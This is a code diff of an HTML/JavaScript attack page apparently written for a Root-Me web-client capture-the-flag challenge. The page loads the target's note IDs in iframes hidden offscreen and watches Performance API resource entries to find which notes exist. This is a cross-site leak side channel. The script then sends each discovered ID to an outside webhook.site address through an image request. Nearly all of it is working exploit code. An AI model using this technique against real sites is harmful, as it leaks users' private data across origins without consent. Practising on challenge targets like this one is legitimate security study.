@@ -9,10 +9,10 @@
     <script>
         const TARGET_BASE = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
         const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
-        const START_ID = 1378;
-        const END_ID = 2000;
+        const START_ID = 2805;
+        const END_ID = 3000;        // adjust if needed
         const DELAY_MS = 500;
-        const IFRAME_TIMEOUT = 2000;
+        const IFRAME_TIMEOUT = 3000;
 
         const CSS_URL = 'https://web-client-ch56.challenge01.root-me.org:58056/static/css/style.css';
         const JS_URL  = 'https://web-client-ch56.challenge01.root-me.org:58056/static/js/main.js';
@@ -23,65 +23,65 @@
             console.log(msg);
         }
 
-        // Check if a specific resource was loaded during iframe loading
-        function resourceLoaded(url, beforeTime) {
-            const entries = performance.getEntriesByType('resource');
-            for (let e of entries) {
-                if (e.name === url && e.startTime > beforeTime) {
-                    return true;
-                }
-            }
-            return false;
-        }
-
-        // Measure whether the target page loads the CSS/JS resources
         async function checkResources(id) {
             return new Promise((resolve) => {
                 const url = TARGET_BASE + id;
                 const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
+                iframe.style.position = 'absolute';
+                iframe.style.top = '-9999px';
+                iframe.style.left = '-9999px';
+                iframe.style.width = '1px';
+                iframe.style.height = '1px';
                 iframe.src = url;
-                const beforeTime = performance.now();
+
                 let resolved = false;
+                let foundCSS = false;
+                let foundJS = false;
+
+                // Monitor resource entries
+                const observer = new PerformanceObserver((list) => {
+                    for (const entry of list.getEntries()) {
+                        if (entry.name === CSS_URL) foundCSS = true;
+                        if (entry.name === JS_URL) foundJS = true;
+                    }
+                    if (foundCSS || foundJS) {
+                        if (!resolved) {
+                            resolved = true;
+                            observer.disconnect();
+                            clearTimeout(timeout);
+                            document.body.removeChild(iframe);
+                            resolve(true);
+                        }
+                    }
+                });
+                observer.observe({ entryTypes: ['resource'] });
 
                 const timeout = setTimeout(() => {
                     if (!resolved) {
                         resolved = true;
+                        observer.disconnect();
                         document.body.removeChild(iframe);
-                        const hasCSS = resourceLoaded(CSS_URL, beforeTime);
-                        const hasJS  = resourceLoaded(JS_URL, beforeTime);
-                        updateStatus(`ID ${id}: CSS=${hasCSS}, JS=${hasJS}`);
-                        resolve(hasCSS || hasJS);
+                        updateStatus(`ID ${id}: timeout (CSS=${foundCSS}, JS=${foundJS})`);
+                        resolve(foundCSS || foundJS);
                     }
                 }, IFRAME_TIMEOUT);
 
-                iframe.onload = () => {
-                    clearTimeout(timeout);
-                    if (resolved) return;
-                    resolved = true;
-                    // Give subresources a moment to load
-                    setTimeout(() => {
-                        const hasCSS = resourceLoaded(CSS_URL, beforeTime);
-                        const hasJS  = resourceLoaded(JS_URL, beforeTime);
-                        updateStatus(`ID ${id}: CSS=${hasCSS}, JS=${hasJS}`);
-                        document.body.removeChild(iframe);
-                        resolve(hasCSS || hasJS);
-                    }, 200);
-                };
+                // Start loading
                 document.body.appendChild(iframe);
             });
         }
 
         async function run() {
-            updateStatus(`Starting scan from ${START_ID} to ${END_ID}...`);
+            updateStatus(`Scanning IDs ${START_ID}–${END_ID}...`);
             for (let id = START_ID; id <= END_ID; id++) {
-                // Clear previous performance entries
                 performance.clearResourceTimings();
-                const hasResources = await checkResources(id);
-                if (hasResources) {
-                    updateStatus(`✅ Found note ID: ${id}`);
+                const found = await checkResources(id);
+                if (found) {
+                    updateStatus(`✅ Valid note at ID ${id}`);
                     new Image().src = `${WEBHOOK}?id=${id}`;
                     break; // remove break to continue scanning
+                } else {
+                    updateStatus(`ID ${id}: no resources detected`);
                 }
                 await new Promise(r => setTimeout(r, DELAY_MS));
             }
